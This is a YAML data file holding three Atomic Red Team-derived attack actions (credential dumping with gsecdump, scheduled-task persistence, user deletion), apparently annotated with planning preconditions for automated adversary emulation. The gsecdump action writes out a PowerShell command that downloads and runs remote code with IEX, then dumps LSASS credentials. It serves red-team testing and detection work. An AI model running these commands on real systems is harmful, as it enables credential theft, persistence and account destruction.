  - uuid: art-t1003-gsecdump-lsass
    name: Gsecdump
    id:
      - T1003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - OS Credential Dumping
    description: |
      Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
      legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
      action itself stages the binary from web.archive.org with SHA256
      verification if not already present, then runs `gsecdump -a`. Precondition
      is just a powershell session; no marker predicate for the binary. ART
      auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.
    execution:
      executor: Powershell Executor
      command: |
        if (-not (Test-Path "#{gsecdump_exe}")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $parentpath = Split-Path "#{gsecdump_exe}"
          $binpath = "$parentpath\gsecdump-v2b5.exe"
          New-Item -ItemType Directory $parentpath -Force | Out-Null
          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
          if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
            Move-Item $binpath "#{gsecdump_exe}"
          }
        }
        & "#{gsecdump_exe}" -a
    arguments:
      executor:
        description: The Powershell session ID used to invoke the prereq + main command.
        required: true
        pddl_index: executor3_var_in_plan
      gsecdump_exe:
        default: C:\Users\Public\gsecdump.exe
        description: Local path on target where gsecdump binary should be staged and
          run.
        required: true
      gsecdump_url:
        default: 
          https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
        description: Download URL for the gsecdump-v2b5 binary (web archive).
        required: true
      gsecdump_bin_hash:
        default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
        description: Expected SHA256 of the gsecdump-v2b5.exe binary.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1053_005-powershell-scheduled-task
    name: Powershell Cmdlet Scheduled Task
    id:
      - T1053.005
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Scheduled Task/Job: Scheduled Task'
    description: |
      Registers a scheduled task via the native `Register-ScheduledTask`
      cmdlet. Uses `New-ScheduledTaskAction` / `-AtLogon` trigger /
      `RunLevel Highest` principal so the task runs elevated as an
      Administrator group member at each logon. Original ART hardcodes
      `calc.exe`; parameterised. ART auto_generated_guid
      af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd.
    execution:
      executor: Powershell Executor
      command: |
        $Action = New-ScheduledTaskAction -Execute "#{task_command}"
        $Trigger = New-ScheduledTaskTrigger -AtLogon
        $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
        $Set = New-ScheduledTaskSettingsSet
        $Task = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
        Register-ScheduledTask "#{task_name}" -InputObject $Task
    arguments:
      executor:
        description: The Powershell session ID used to register the task.
        required: true
        pddl_index: executor3_var_in_plan
      task_name:
        default: AtomicTask
        description: Name of the scheduled task.
        required: true
      task_command:
        default: C:\Users\Public\payload.exe
        description: Executable the scheduled task launches at logon.
        required: true
        pddl_index: string3_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: art-t1531-delete-user
    name: Delete User - Windows
    id:
      - T1531
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Account Access Removal
    description: |
      Creates a target account (if absent) then deletes it. Strongest form
      of account access removal — the account no longer exists on the
      system. ART auto_generated_guid f21a1d7d-a62f-442a-8c3a-2440d43b19e5.
    execution:
      executor: Command Prompt Executor
      command: |
        net user #{user_account} #{initial_password} /add
        net.exe user #{user_account} /delete
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke net.
        required: true
        pddl_index: executor1_var_in_plan
      user_account:
        default: AtomicUser
        description: Local user to delete (created first if absent).
        required: true
      initial_password:
        default: User2DeletePW!
        description: Initial password if the account has to be created first.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (user-disabled ?target - host)
